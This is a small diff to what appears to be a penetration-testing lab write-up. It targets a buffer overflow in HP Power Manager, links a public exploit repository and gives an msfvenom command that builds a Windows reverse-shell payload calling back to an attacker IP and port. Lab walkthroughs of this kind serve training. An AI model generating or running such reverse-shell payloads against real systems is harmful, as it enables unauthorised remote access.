@@ -28,7 +28,7 @@ this version is vulnerable to Buffer Overflow attack
 ```console
 https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3
 ```
-generate the payload for revershell
+generate the buffer overflow payload for revershell
 ```console
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.180 LPORT=22  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
 
